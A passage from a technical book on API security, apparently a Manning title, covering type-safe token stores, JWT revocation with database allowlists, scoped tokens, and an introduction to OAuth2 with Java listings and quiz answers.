TLS were able to exploit this leak of infor- mation from compression to steal session cookies from compressed HTTP pages. These kinds of attacks are not always a risk, but you should carefully consider the possibility before enabling compression. Unless you really need to save space, you should leave compression disabled.  Pop quiz 4 Which STRIDE threats does authenticated encryption protect against?  There are  multiple correct answers.  a Spoofing b Tampering   206  CHAPTER 6 Self-contained tokens and JWTs   continued   Information disclosure  c Repudiation d e Denial of service f Elevation of privilege  5 What is the purpose of the initialization vector  IV  in an encryption algorithm?  a  b  c  d  It’s a place to add your name to messages. It slows down decryption to prevent brute force attacks. It  increases  the  size  of  the  message  to  ensure  compatibility  with  different algorithms. It ensures that the ciphertext is always different even if a duplicate message is encrypted.  6  True or False: An IV should always be generated using a secure random number generator.  The answers are at the end of the chapter.  6.4  Using types for secure API design Imagine that you have implemented token storage using the kit of parts that you devel- oped  in  this  chapter,  creating  a  JsonTokenStore  and  wrapping  it  in  an  Encrypted- TokenStore  to  add  authenticated  encryption,  providing  both  confidentiality  and authenticity of tokens. But it would be easy for somebody to accidentally remove the encryption if they simply commented out the  EncryptedTokenStore wrapper in the main  method,  losing  both  security  properties.  If  you’d  developed  the  Encrypted- TokenStore  using  an  unauthenticated  encryption  scheme  such  as  CTR  mode  and then manually combined it with the HmacTokenStore, the risk would be even greater because not every way of combining those two stores is secure, as you learned in sec- tion 6.3.1.   The kit-of-parts approach to software design is often appealing to software engi- neers, because it results in a neat design with proper separation of concerns and maxi- mum reusability. This was useful when you could reuse the HmacTokenStore, originally designed  to  protect  database-backed  tokens,  to  also  protect  JSON  tokens  stored  on the client. But a kit-of-parts design is opposed to security if there are many insecure ways to combine the parts and only a few that are secure.  PRINCIPLE Secure  API  design  should  make  it  very  hard  to  write  insecure code.  It  is  not  enough  to  merely  make  it  possible  to  write  secure  code, because developers will make mistakes.  You can make a kit-of-parts design harder to misuse by using types to enforce the secu- rity properties you need, as shown in figure 6.6. Rather than all the individual token   Using types for secure API design  207  The TokenStore interface provides the basic operations.  TokenStore  +create ...  +read ...   Marker interfaces are used to indicate security properties.  ConﬁdentialTokenStore  AuthenticatedTokenStore  SecureTokenStore  Deﬁne a SecureTokenStore as a combination of the desired security goals.  Figure 6.6 You can use marker interfaces to indicate the security properties  of your individual token stores. If a store provides only confidentiality, it should  implement the ConfidentialTokenStore interface. You can then define a  SecureTokenStore by subtyping the desired combination of security properties.  In this case, it ensures both confidentiality and authentication.  stores implementing a generic TokenStore interface, you can define marker interfaces that describe the security properties of the implementation. A  ConfidentialToken- Store  ensures  that  token  state  is  kept  secret,  while  an  AuthenticatedTokenStore ensures that the token cannot be tampered with or faked. We can then define a Secure- TokenStore that is a sub-type of each of the security properties that we want to enforce. In this case, you want the token controller to use a token store that is both confidential and  authenticated.  You  can  then  update  the  TokenController  to  require  a  Secure- TokenStore, enforcing that an insecure implementation is not used by mistake.  DEFINITION A marker interface is an interface that defines no new methods. It is  used  purely  to  indicate  that  the  implementation  has  certain  desirable properties.  Navigate to src main java com manning apisecurityinaction token and add the three new marker interfaces, as shown in listing 6.8. Create three separate files, Confidential- TokenStore.java, AuthenticatedTokenStore.java, and SecureTokenStore.java to hold the three new interfaces.      208  CHAPTER 6 Self-contained tokens and JWTs  Listing 6.8 The secure marker interfaces  The ConfidentialTokenStore marker interface should go in ConfidentialTokenStore.java.  package com.manning.apisecurityinaction.token;                   public interface ConfidentialTokenStore extends TokenStore {    }                                                                package com.manning.apisecurityinaction.token;                    public interface AuthenticatedTokenStore extends TokenStore {    }                                                                 package com.manning.apisecurityinaction.token;                       public interface SecureTokenStore extends ConfidentialTokenStore,       AuthenticatedTokenStore {                                       The AuthenticatedTokenStore should }                                                                   go in AuthenticatedTokenStore.java.  The SecureTokenStore combines them  and goes in SecureTokenStore.java.  You can now change each of the token stores to implement an appropriate interface:  If you assume that the backend cookie storage is secure against injection and other  attacks,  then  the  CookieTokenStore  can  be  updated  to  implement  the SecureTokenStore interface.   If you’ve followed the hardening advice from  chapter 5, the  DatabaseToken- Store can also be marked as a SecureTokenStore. If you want to ensure that it is always used with HMAC for extra protection against tampering, then mark it as only confidential.   The JsonTokenStore is completely insecure on its own, so leave it implement-  ing the base TokenStore interface.   The SignedJwtTokenStore provides no confidentiality for claims in the JWT, so  it should only implement the AuthenticatedTokenStore interface.   The HmacTokenStore turns any TokenStore into an AuthenticatedTokenStore. But if the underlying store is already confidential, then the result is a Secure- TokenStore. You can reflect this difference in code by making the HmacToken- Store constructor private and providing two static factory methods instead, as shown in listing 6.9. If the underlying store is confidential, then the first method will return a SecureTokenStore. For anything else, the second method will be called and return only an AuthenticatedTokenStore.   The EncryptedTokenStore and EncryptedJwtTokenStore can both be changed to  implement  SecureTokenStore  because  they  both  provide  authenticated encryption that achieves the combined security goals no matter what underly- ing store is passed in.   When passed any other TokenStore, returns an Authenticated- TokenStore.  6.5  Handling token revocation  209  Listing 6.9 Updating the HmacTokenStore  public class HmacTokenStore implements SecureTokenStore {      Mark the  HmacTokenStore  as secure.  Make the  constructor  private.      private final TokenStore delegate;     private final Key macKey;         private HmacTokenStore TokenStore delegate, Key macKey  {              this.delegate = delegate;         this.macKey = macKey;     }     public static SecureTokenStore wrap ConfidentialTokenStore store,                                            Key macKey  {                            return new HmacTokenStore store, macKey ;                            }                                                                        public static AuthenticatedTokenStore wrap TokenStore store,                                             Key macKey  {                    return new HmacTokenStore store, macKey ;                      }                                                               When passed a ConfidentialTokenStore, returns a SecureTokenStore.  You can now update the TokenController class to require a SecureTokenStore to be passed to it. Open TokenController.java in your editor and update the constructor to take a SecureTokenStore:      public TokenController SecureTokenStore tokenStore  {         this.tokenStore = tokenStore;     }  This change makes it much harder for a developer to accidentally pass in an imple- mentation  that  doesn’t  meet  your  security  goals,  because  the  code  will  fail  to  type- check. For example, if you try to pass in a plain JsonTokenStore, then the code will fail to compile with a type error. These marker interfaces also provide valuable docu- mentation of the expected security properties of each implementation, and a guide for code reviewers and security audits to check that they achieve them.  Handling token revocation Stateless self-contained tokens such as JWTs are great for moving state out of the data- base. On the face of it, this increases the ability to scale up the API without needing additional database hardware or more complex deployment topologies. It’s also much easier to set up a new API with just an encryption key rather than needing to deploy a new database or adding a dependency on an existing one. After all, a shared token database is a single point of failure. But the Achilles’ heel of stateless tokens is how to handle token revocation. If all the state is on the client, it becomes much harder to invalidate that state to revoke a token. There is no database to delete the token from.  There are a few ways to handle this. First, you could just ignore the problem and not allow tokens to be revoked. If your tokens are short-lived and your API does not handle sensitive data or perform privileged operations, then you might be comfortable   210  CHAPTER 6 Self-contained tokens and JWTs  with the risk of not letting users explicitly log out. But few APIs fit this description; almost all data is sensitive to somebody. This leaves several options, almost all of which involve storing some state on the server after all:   You can add some minimal state to the database that lists a unique ID associated with the token. To revoke a JWT, you delete the corresponding record from the database.  To  validate  the  JWT,  you  must  now  perform  a  database  lookup  to check if the unique ID is still in the database. If it is not, then the token has been revoked. This is known as an allowlist.4   A twist on the above scheme is to only store the unique ID in the database when the token is revoked, creating a blocklist of revoked tokens. To validate, make sure  that  there  isn’t  a  matching  record  in  the  database.  The  unique  ID  only needs to be blocked until the token expires, at which point it will be invalid any- way. Using short expiry times helps keep the blocklist small.   Rather than blocking individual tokens, you can block certain attributes of a set of tokens. For example, it is a common security practice to invalidate all of a user’s existing sessions when they change their password. Users often change their  password  when  they  believe  somebody  else  may  have  accessed  their account, so invalidating any existing sessions will kick the attacker out. Because there  is  no  record  of  the  existing  sessions  on  the  server,  you  could  instead record an entry in the database saying that all tokens issued to user Mary before lunchtime on Friday should be considered invalid. This saves space in the data- base at the cost of increased query complexity.   Finally,  you  can  issue  short-lived  tokens  and  force  the  user  to  reauthenticate regularly. This limits the damage that can be done with a compromised token without  needing  any  additional  state  on  the  server  but  provides  a  poor  user experience. In chapter 7, you’ll use OAuth2 refresh tokens to provide a more transparent version of this pattern.  6.5.1  Implementing hybrid tokens The existing DatabaseTokenStore can be used to implement a list of valid JWTs, and this is the simplest and most secure default for most APIs. While this involves giving up on the pure stateless nature of a JWT architecture, and may initially appear to offer the  worst  of  both  worlds—reliance  on  a  centralized  database  along  with  the  risky nature of client-side state—in fact, it offers many advantages over each storage strategy on its own:   Database tokens can be easily and immediately revoked. In September 2018, Face- book was hit by an attack that exploited a vulnerability in some token-handling code to quickly gain access to the accounts of many users  https:  newsroom .fb.com news 2018 09 security-update  . In the wake of the attack, Facebook  4 The terms allowlist and blocklist are now preferred over the older terms whitelist and blacklist due to negative  connotations associated with the old terms.   Handling token revocation  211  revoked 90 million tokens, forcing those users to reauthenticate. In a disaster situ- ation, you don’t want to be waiting hours for tokens to expire or suddenly finding scalability issues with your blocklist when you add 90 million new entries.   On the other hand, plain database tokens may be vulnerable to token theft and forgery if the database is compromised, as described in section 5.3 of chapter 5. In that chapter, you hardened database tokens by using the HmacTokenStore to prevent forgeries. Wrapping database tokens in a JWT or other authenticated token format achieves the same protections.   Less  security-critical  operations  can  be  performed  based  on  data  in  the  JWT alone, avoiding a database lookup. For example, you might decide to let a user see which Natter social spaces they are a member of and how many unread mes- sages they have in each of them without checking the revocation status of the token, but require a database check when they actually try to read one of those or post a new message.   Token attributes can be moved between the JWT and the database depending on how sensitive they are or how likely they are to change. You might want to store some basic information about the user in the JWT but store a last activ- ity time for implementing idle timeouts in the database because it will change frequently.  DEFINITION An idle timeout  or inactivity logout  automatically revokes an authen- tication token if it hasn’t been used for a certain amount of time. This can be used to automatically log out a user if they have stopped using your API but have forgotten to log out manually.  Listing  6.10  shows  the  EncryptedJwtTokenStore  updated  to  list  valid  tokens  in  the database. It does this by taking an instance of the DatabaseTokenStore as a construc- tor argument and uses that to create a dummy token with no attributes. If you wanted to move attributes from the JWT to the database, you can do that here by populating the  attributes  in  the  database  token  and  removing  them  from  the  JWT  token.  The token ID returned from the database is then stored inside the JWT as the standard JWT ID  jti  claim. Open JwtTokenStore.java in your editor and update it to allowlist tokens in the database as in the listing.  Listing 6.10 Allowlisting JWTs in the database  public class EncryptedJwtTokenStore implements SecureTokenStore {      private final SecretKey encKey;     private final DatabaseTokenStore tokenAllowlist;                  public EncryptedJwtTokenStore SecretKey encKey,                          DatabaseTokenStore tokenAllowlist  {            this.encKey = encKey;         this.tokenAllowlist = tokenAllowlist;                        }  Inject a Database- TokenStore into the  EncryptedJwtToken- Store to use for the  allowlist.   212  CHAPTER 6 Self-contained tokens and JWTs      @Override     public String create Request request, Token token  {         var allowlistToken = new Token token.expiry, token.username ;           var jwtId = tokenAllowlist.create request, allowlistToken ;              var claimsBuilder = new JWTClaimsSet.Builder                   .jwtID jwtId      Save the                 .subject token.username  database token                 .audience "https:  localhost:4567"  ID in the JWT                 .expirationTime Date.from token.expiry  ; as the JWT ID         token.attributes.forEach claimsBuilder::claim ; claim.  Save a copy of the token in the database but remove all the attributes to save space.          var header = new JWEHeader JWEAlgorithm.DIR,                EncryptionMethod.A128CBC_HS256 ;         var jwt = new EncryptedJWT header, claimsBuilder.build   ;          try {             var encryptor = new DirectEncrypter encKey ;             jwt.encrypt encryptor ;         } catch  JOSEException e  {             throw new RuntimeException e ;         }          return jwt.serialize  ;     }  To revoke a JWT, you then simply delete it from the database token store, as shown in listing 6.11. Parse and decrypt the JWT as before, which will validate the authentica- tion  tag,  and  then  extract  the  JWT  ID  and  revoke  it  from  the  database.  This  will remove  the  corresponding  record  from  the  database.  While  you  still  have  the  Jwt- TokenStore.java open in your editor, add the implementation of the revoke method from the listing.  Listing 6.11 Revoking a JWT in the database allowlist  @Override public void revoke Request request, String tokenId  {     try {         var jwt = EncryptedJWT.parse tokenId ;                  var decryptor = new DirectDecrypter encKey ;            jwt.decrypt decryptor ;                                 var claims = jwt.getJWTClaimsSet  ;              Parse, decrypt,  and validate the  JWT using the  decryption key.          tokenAllowlist.revoke request, claims.getJWTID   ;          } catch  ParseException  JOSEException e  {         throw new IllegalArgumentException "invalid token", e ;     } }  Extract the JWT ID  and revoke it from  the Database- TokenStore  allowlist.  The final part of the solution is to check that the allowlist token hasn’t been revoked when reading a JWT token. As before, parse and decrypt the JWT using the decryption   Summary  213  key. Then extract the JWT ID and perform a lookup in the  DatabaseTokenStore. If the entry exists in the database, then the token is still valid, and you can continue vali- dating the other JWT claims as before. But if the database returns an empty result, then the token has been revoked and so it is invalid. Update the  read   method in JwtTokenStore.java to implement this addition check, as shown in listing 6.12. If you moved some attributes into the database, then you could also copy them to the token result in this case.  Listing 6.12 Checking if a JWT has been revoked      var jwt = EncryptedJWT.parse tokenId ;               var decryptor = new DirectDecrypter encKey ;         jwt.decrypt decryptor ;                           Parse and decrypt  the JWT.      var claims = jwt.getJWTClaimsSet  ;     var jwtId = claims.getJWTID  ;                              if  tokenAllowlist.read request, jwtId .isEmpty    {            return Optional.empty  ;         }        Validate other JWT claims  If not, then the token is invalid;  otherwise, proceed with  validating other JWT claims.  Check if the JWT ID  still exists in the  database allowlist.  Answers to pop quiz questions  1 a and b. HMAC prevents an attacker from creating bogus authentication tokens   spoofing  or tampering with existing ones.  2 e. The aud  audience  claim lists the servers that a JWT is intended to be used by. It is crucial that your API rejects any JWT that isn’t intended for that service. 3 False. The algorithm header can’t be trusted and should be ignored. You should  associate the algorithm with each key instead.  4 a, b, and d. Authenticated encryption includes a MAC so protects against spoof- ing and tampering threats just like HMAC. In addition, these algorithms pro- tect confidential data from information disclosure threats.  5 d. The IV  or nonce  ensures that every ciphertext is different. 6 True.  IVs  should  be  randomly  generated.  Although  some  algorithms  allow  a simple  counter,  these  are  very  hard  to  synchronize  between  API  servers  and reuse can be catastrophic to security.  Summary   Token state can be stored on the client by encoding it in JSON and applying  HMAC authentication to prevent tampering.   Sensitive token attributes can be protected with encryption, and efficient authen-  ticated encryption algorithms can remove the need for a separate HMAC step.   The JWT and JOSE specifications provide a standard format for authenticated and  encrypted  tokens  but  have  historically  been  vulnerable  to  several  serious attacks.    214  CHAPTER 6 Self-contained tokens and JWTs   When used carefully, JWT can be an effective part of your API authentication  strategy but you should avoid the more error-prone parts of the standard.   Revocation  of  stateless  JWTs  can  be  achieved  by  maintaining  an  allowlist  or blocklist of tokens in the database. An allowlisting strategy is a secure default offering advantages over both pure stateless tokens and unauthenticated data- base tokens.   Part 3  Authorization  Now  that  you  know  how  to  identify  the  users  of  your  APIs,  you  need  to  decide what they should do. In this part, you’ll take a deep dive into authoriza- tion techniques for making those crucial access control decisions.    Chapter 7 starts by taking a look at delegated authorization with OAuth2. In this  chapter,  you’ll  learn  the  difference  between  discretionary  and  mandatory access control and how to protect APIs with OAuth2 scopes.   Chapter 8 looks at approaches to access control based on the identity of the user  accessing  an  API.  The  techniques  in  this  chapter  provide  more  flexible alternatives to the access control lists developed in chapter 3. Role-based access control  groups  permissions  into  logical  roles  to  simplify  access  management, while attribute-based access control uses powerful rule-based policy engines to enforce complex policies.    Chapter  9  discusses  a  completely  different  approach  to  access  control,  in which the identity of the user plays no part in what they can access. Capability- based access control is based on individual keys with fine-grained permissions. In this chapter, you’ll see how a capability-based model fits with RESTful API design principles and examine the trade-offs compared to other authorization approaches.  You’ll  also  learn  about  macaroons,  an  exciting new  token format that  allows  broadly-scoped  access  tokens  to  be  converted  on-the-fly  into  more restricted capabilities with some unique abilities.       OAuth2 and OpenID Connect  This chapter covers  Enabling third-party access to your API with   scoped tokens   Integrating an OAuth2 Authorization Server for   delegated authorization   Validating OAuth2 access tokens with token    Implementing single sign-on with OAuth and   introspection  OpenID Connect  In the last few chapters, you’ve implemented user authentication methods that are suitable  for  the  Natter  UI  and  your  own  desktop  and  mobile  apps.  Increasingly, APIs are being opened to third-party apps and clients from other businesses and organizations. Natter is no different, and your newly appointed CEO has decided that you can boost growth by encouraging an ecosystem of Natter API clients and services. In this chapter, you’ll integrate an OAuth2 Authorization Server  AS  to allow your users to delegate access to third-party clients. By using scoped tokens, users can restrict which parts of the API those clients can access. Finally, you’ll see how OAuth provides a standard way to centralize token-based authentication within  217   218  CHAPTER 7 OAuth2 and OpenID Connect  7.1  your  organization  to  achieve  single  sign-on  across  different  APIs  and  services.  The OpenID Connect standard builds on top of OAuth2 to provide a more complete authen- tication framework when you need finer control over how a user is authenticated.   In this chapter, you’ll learn how to obtain a token from an AS to access an API, and how to  validate those tokens in  your API, using the Natter API as an example.  You won’t learn how to write your own AS, because this is beyond the scope of this book. Using OAuth2 to authorize service-to-service calls is covered in chapter 11.

Because all the mechanisms described in this chapter are standards, the patterns will work with any standards-compliant AS with few changes. See appendix A for details of how to install and configure an AS for use in this chapter.  Scoped tokens In the bad old days, if you wanted to use a third-party app or service to access your email or bank account, you had little choice but to give them your username and pass- word  and  hope  they  didn’t  misuse  them.  Unfortunately,  some  services  did  misuse those credentials. Even the ones that were trustworthy would have to store your pass- word in a recoverable form to be able to use it, making potential compromise much more likely, as you learned in chapter 3. Token-based authentication provides a solu- tion to this problem by allowing you to generate a long-lived token that you can give to the third-party service instead of your password. The service can then use the token to act on your behalf. When you stop using the service, you can revoke the token to prevent any further access.   Though using a token means that you don’t need to give the third-party your pass- word, the tokens you’ve used so far still grant full access to APIs as if you were perform- ing actions yourself. The third-party service can use the token to do anything that you can do. But you may not trust a third-party to have full access, and only want to grant them partial access. When I ran my own business, I briefly used a third-party service to read transactions from my business bank account and import them into the accounting software I used. Although that service needed only read access to recent transactions, in practice it had full access to my account and could have transferred funds, cancelled payments,  and performed many other actions. I stopped using  the  service  and  went back to manually entering transactions because the risk was too great.1   The solution to these issues is to restrict the API operations that can be performed with a token, allowing it to be used only within a well-defined scope. For example, you might  let  your  accounting  software  read  transactions  that  have  occurred  within  the  1  In some countries, banks are being required to provide secure API access to transactions and payment services to third-party apps and services. The UK’s Open Banking initiative and the European Payment Services Direc- tive 2  PSD2  regulations are examples, both of which mandate the use of OAuth2.   Scoped tokens  219  last 30 days, but not let it view or create new payments on the account. The scope of the access you’ve granted to the accounting software is therefore limited to read-only access to recent transactions. Typically, the scope of a token is represented as one or more string labels stored as an attribute of the token. For example, you might use the scope  label  transactions:read  to  allow  read-access  to  transactions,  and  payment :create to allow setting up a new payment from an account. Because there may be more  than  one  scope  label  associated  with  a  token,  they  are  often  referred  to  as scopes. The scopes  labels  of a token collectively define the scope of access it grants. Figure 7.1 shows some of the scope labels available when creating a personal access token on GitHub.  The user can add a note to remember why they created this token.  Scopes control access to different sections of the API.  GitHub supports hierarchical scopes, allowing the user to easily grant related scopes.  Figure 7.1 GitHub allows users to manually create scoped tokens, which they call  personal access tokens. The tokens never expire but can be restricted to only allow  access to parts of the GitHub API by setting the scope of the token.  DEFINITION A  scoped  token  limits  the operations  that  can  be  performed  with that token. The set of operations that are allowed is known as the scope of the token. The scope of a token is specified by one or more scope labels, which are often referred to collectively as scopes.   220  7.1.1  CHAPTER 7 OAuth2 and OpenID Connect  Adding scoped tokens to Natter Adapting the existing login endpoint to issue scoped tokens is very simple, as shown in listing 7.1. When a login request is received, if it contains a scope parameter then you can associate that scope with the token by storing it in the token attributes. You can define a default set of scopes to grant if the scope parameter is not specified. Open the TokenController.java file in your editor and update the login method to add sup- port for scoped tokens, as in listing 7.1. At the top of the file, add a new constant list- ing all the scopes. In Natter, you’ll use scopes corresponding to each API operation:  private static final String DEFAULT_SCOPES =     "create_space post_message read_message list_messages " +   "delete_message add_member";  WARNING There is a potential privilege escalation issue to be aware of in this code. A client that is given a scoped token can call this endpoint to exchange it for one with more scopes. You’ll fix that shortly by adding a new access con- trol rule for the login endpoint to prevent this.  Listing 7.1 Issuing scoped tokens  public JSONObject login Request request, Response response  {     String subject = request.attribute "subject" ;     var expiry = Instant.now  .plus 10, ChronoUnit.MINUTES ;      var token = new TokenStore.Token expiry, subject ;     var scope = request.queryParamOrDefault "scope", DEFAULT_SCOPES ;        token.attributes.put "scope", scope ;                                    var tokenId = tokenStore.create request, token ;      response.status 201 ;     return new JSONObject               .put "token", tokenId ; }  Store the scope in the token attributes, defaulting to all scopes if not specified.  To enforce the scope restrictions on a token, you can add a new access control filter that ensures that the token used to authorize a request to the API has the required scope for the operation being performed. This filter looks a lot like the existing per- mission filter that you added in chapter 3 and is shown in listing 7.2.  I’ll discuss the differences between scopes and permissions in the next section.  To verify the scope, you need to perform several checks:   First, check if the HTTP method of the request matches the method that this rule is for, so that you don’t apply a scope for a POST request to a DELETE request or vice versa. This is needed because Spark’s filters are matched only by the path and not the request method.    You can then look up the scope associated with the token that authorized the current request from the scope attribute of the request. This works because   Scoped tokens  221  the token validation code you wrote in chapter 4 copies any attributes from the token into the request, so the scope attribute will be copied across too.    If there is no scope attribute, then the user directly authenticated the request with Basic authentication. In this case, you can skip the scope check and let the request proceed. Any client with access to the user’s password would be able to issue themselves a token with any scope.   Finally, you can verify that the scope of the token matches the required scope for this request, and if it doesn’t, then you should return a 403 Forbidden error. The Bearer authentication scheme has a dedicated error code insufficient_ scope to indicate that the caller needs a token with a different scope, so you can indicate that in the WWW-Authenticate header.  Open TokenController.java in your editor again and add the requireScope method from the listing.  Listing 7.2 Checking required scopes  If the HTTP method doesn’t match, then ignore this rule.  public Filter requireScope String method, String requiredScope  {     return  request, response  -> {         if  !method.equalsIgnoreCase request.requestMethod                     return;                                                         var tokenScope = request. attribute "scope" ;              if  tokenScope == null  return;                            If the token is unscoped, then allow all operations.          if  !Set.of tokenScope.split " "                                          .contains requiredScope   {                                   response.header "WWW-Authenticate",                                       "Bearer error=\"insufficient_scope\"," +                                  "scope=\"" + requiredScope + "\"" ;               halt 403 ;                                                    }     }; }  If the token scope  doesn’t contain  the required  scope, then return  a 403 Forbidden  response.  You can now use this method to enforce which scope is required to perform certain operations, as shown in listing 7.3. Deciding what scopes should be used by your API, and exactly which scope should be required for which operations is a complex topic, discussed  in  more  detail  in  the  next  section.  For  this  example,  you  can  use  fine- grained scopes corresponding to each API operation: create_space, post_message, and so  on.  To avoid  privilege  escalation,  you  should  require a  specific  scope to  call  the login endpoint, because this can be used to obtain a token with any scope, effectively bypassing the scope checks.2 On the other hand, revoking a token by calling the logout  2 An alternative way to eliminate this risk is to ensure that any newly issued token contains only scopes that are  in the token used to call the login endpoint. I’ll leave this as an exercise.   222  CHAPTER 7 OAuth2 and OpenID Connect  endpoint should not require any scope.

Scoped tokens  223  7.1.2  The difference between scopes and permissions At first glance, it may seem that scopes and permissions are very similar, but there is a distinction in what they are used for, as shown in figure 7.2. Typically, an API is owned and operated by a central authority such as a company or an organization. Who can access the API and what they are allowed to do is controlled entirely by the central authority. This is an example of mandatory access control, because the users have no con- trol over their own permissions or those of other users. On the other hand, when a user delegates some of their access to a third-party app or service, that is known as dis- cretionary access control, because it’s up to the user how much of their access to grant to the third party. OAuth scopes are fundamentally about discretionary access control, while traditional permissions  which you implemented using ACLs in chapter 3  can be used for mandatory access control.  Users can delegate some of their access to third parties, using scopes to restrict the delegated access.  Delegate with  scope  Grant  permission  User  Third-party app  Permissions are granted to users by a central authority that owns the API.  Authority  Owns  API  Figure 7.2 Permissions are  typically granted by a central  authority that owns the API  being accessed. A user does not  get to choose or change their  own permissions. Scopes allow  a user to delegate part of their  authority to a third-party app,  restricting how much access  they grant using scopes.  DEFINITION With mandatory access control  MAC , user permissions are set and enforced by a central authority and cannot be granted by users themselves. With discretionary access control  DAC , users can delegate some of their permis- sions to other users. OAuth2 allows discretionary access control, also known as delegated authorization.  Whereas scopes are used for delegation, permissions may be used for either manda- tory or discretionary access. File permissions in UNIX and most other popular operat- ing systems can be set by the owner of the file to grant access to other users and so implement DAC. In contrast, some operating systems used by the military and govern- ments  have  mandatory  access  controls  that  prevent  somebody  with  only  SECRET clearance from reading TOP SECRET documents, for example, regardless of whether the owner of the file wants to grant them access.3 Methods for organizing and enforcing  3 Projects such as SELinux  https:  selinuxproject.org page Main_Page  and AppArmor  https:  apparmor  .net   bring mandatory access controls to Linux.   224  CHAPTER 7 OAuth2 and OpenID Connect  permissions for MAC are covered in chapter 8. OAuth scopes provide a way to layer DAC on top of an existing MAC security layer.   Putting the theoretical distinction between  MAC and DAC  to one side, the more practical distinction between scopes and permissions relates to how they are designed. The administrator of an API designs permissions to reflect the security goals for the sys- tem. These permissions reflect organizational policies. For example, an employee doing one job might have read and write access to all documents on a shared drive. Permis- sions should be designed based on access control decisions that an administrator may want to make for individual users, while scopes should be designed based on anticipat- ing how users may want to delegate their access to third-party apps and services.   NOTE The delegated authorization in OAuth is about users delegating their authority  to  clients,  such  as  mobile  apps.  The  User  Managed  Access   UMA  extension of OAuth2 allows users to delegate access to other users.  An  example  of  this  distinction  can  be  seen  in  the  design  of  OAuth  scopes  used  by Google for access to their Google Cloud Platform services. Services that deal with sys- tem  administration  jobs,  such  as  the  Key  Management  Service  for  handling  cryp- tographic keys, only have a single scope that grants access to that entire API. Access to individual keys is managed through permissions instead. But APIs that provide access to  individual  user  data,  such  as  the  Fitness  API   http:  mng.bz EEDJ   are  broken down  into  much  more  fine-grained  scopes,  allowing  users  to  choose  exactly  which health statistics they wish to share with third parties, as shown in figure 7.3. Providing users with fine-grained control when sharing their data is a key part of a modern pri- vacy and consent strategy and may be required in some cases by legislation such as the EU General Data Protection Regulation  GDPR .   Another distinction between scopes and permissions is that scopes typically only identify the set of API operations that can be performed, while permissions also iden- tify the specific objects that can be accessed. For example, a client may be granted a list_files scope that allows it to call an API operation to list files on a shared drive, but the set of files returned may differ depending on the permissions of the user that authorized the token. This  distinction is  not fundamental, but reflects the fact  that scopes are often added to an API as an additional layer on top of an existing permis- sion system and are checked based on basic information in the HTTP request without knowledge of the individual data objects that will be operated on.    When choosing which scopes to expose in your API, you should consider what level  of  control  your  users  are  likely  to  need  when  delegating  access.  There  is  no simple answer to this question, and scope design typically requires several iterations of  collaboration  between  security  architects,  user  experience  designers,  and  user representatives.   LEARN ABOUT IT Some general strategies for scope design and documentation are provided in The Design of Web APIs by Arnaud Lauret  Manning, 2019; https:  www.manning.com books the-design-of-web-apis .   Scoped tokens  225  System APIs use only coarse-grained scopes to allow access to the entire API  APIs processing user data provide more ﬁne-grained scopes to allow users to control what they share.  Figure 7.3 Google Cloud Platform OAuth scopes are very coarse-grained for system APIs such as  database access or key management. For APIs that process user data, such as the Fitness API, many  more scopes are defined, allowing users greater control over what they share with third-party apps  and services.  Pop quiz 1 Which of the following are typical differences between scopes and permissions?  a Scopes are more fine-grained than permissions. b Scopes are more coarse-grained than permissions. c Scopes use longer names than permissions. d Permissions are often set by a central authority, while scopes are designed for  delegating access.  e Scopes typically only restrict the API operations that can be called. Permis-  sions also restrict which objects can be accessed.  The answer is at the end of the chapter.   226  7.2  CHAPTER 7 OAuth2 and OpenID Connect  Introducing OAuth2 Although allowing your users to manually create scoped tokens for third-party applica- tions is an improvement over sharing unscoped tokens or user credentials, it can be confusing and error-prone. A user may not know which scopes are required for that application to function and so may create a token with too few scopes, or perhaps del- egate all scopes just to get the application to work.    A better solution is for the application to request the scopes that it requires, and then  the  API  can  ask  the  user  if  they  consent.  This  is  the  approach  taken  by  the OAuth2 delegated authorization protocol, as shown in figure 7.4. Because an organi- zation may have many APIs, OAuth introduces the notion of an Authorization Server  AS ,  which  acts  as  a  central  service  for managing  user  authentication and  consent and issuing tokens. As you’ll see later in this chapter, this centralization provides sig- nificant  advantages even  if your  API  has  no  third-party  clients,  which  is  one  reason why OAuth2 has become so popular as a standard for API security. The tokens that an application uses to access an API are known as access tokens in OAuth2, to distinguish them from other sorts of tokens that you’ll learn about later in this chapter.  DEFINITION An  access  token  is  a  token  issued  by  an  OAuth2  authorization server to allow a client to access an API.  Before a third-party client can use an API, it must ﬁrst obtain an access token.  Third-party app  Use access token  API  Consent  The app tells the AS what scope of access it requires.  n e k o t   s s e c c A  R e q u e s t   s c o p e  Authorization  server  The Authorization Server checks that the user consents to this access.  Figure 7.4 To access an API using OAuth2, an app must first obtain an  access token from the Authorization Server  AS . The app tells the AS what  scope of access it requires. The AS verifies that the user consents to this  access and issues an access token to the app. The app can then use the  access token to access the API on the user’s behalf.   Introducing OAuth2  227  OAuth uses specific terms to refer to the four entities shown in figure 7.4, based on the role they play in the interaction:   The authorization server  AS  authenticates the user and issues tokens to clients.  The user is known as the resource owner  RO , because it’s typically their resources  documents, photos, and so on  that the third-party app is trying to access. This term is not always accurate, but it has stuck now.   The third-party app or service is known as the client.  The API that hosts the user’s resources is known as the resource server  RS .  7.2.1  Types of clients Before a client can ask for an access token it must first register with the AS and obtain a unique client ID. This can either be done manually by a system administrator, or there is a standard to allow clients to dynamically register with an AS  https:  tools.ietf .org html rfc7591 .   LEARN ABOUT IT OAuth2 in Action by Justin Richer and Antonio Sanso  Manning, 2017; https:  www.manning.com books oauth-2-in-action  covers dynamic cli- ent registration in more detail.  There are two different types of clients:   Public clients are applications that run entirely within a user’s own device, such as a mobile app or JavaScript client running in a browser. The client is completely under the user’s control.   Confidential clients run in a protected web server or other secure location that is  not under a user’s direct control.   The main difference between the two is that a confidential client can have its own client credentials that it uses to authenticate to the authorization server. This ensures that an attacker cannot impersonate a legitimate client to try to obtain an access token from a user in a phishing attack. A mobile or browser-based application cannot keep credentials secret because any user that downloads the application could extract them.4 For public clients, alternative measures are used to protect against these attacks, as you’ll see shortly.  DEFINITION A confidential client uses client credentials to authenticate to the AS. Usually, this is a long random password known as a client secret, but more secure forms of authentication can be used, including JWTs and TLS client certificates.  Each client can typically be configured with the set of scopes that it can ask a user for. This  allows  an  administrator  to  prevent  untrusted  apps  from  even  asking  for  some scopes if they allow privileged access. For example, a bank might allow most clients  4 A possible solution to this is to dynamically register each individual instance of the application as a new client when it starts up so that each gets its own unique credentials. See chapter 12 of OAuth2 in Action  Manning, 2017  for details.   228  7.2.2  CHAPTER 7 OAuth2 and OpenID Connect  read-only access to a user’s recent transactions but require more extensive validation of the app’s developer before the app can initiate payments.  Authorization grants To obtain an access token, the client must first obtain consent from the user in the form of an authorization grant with 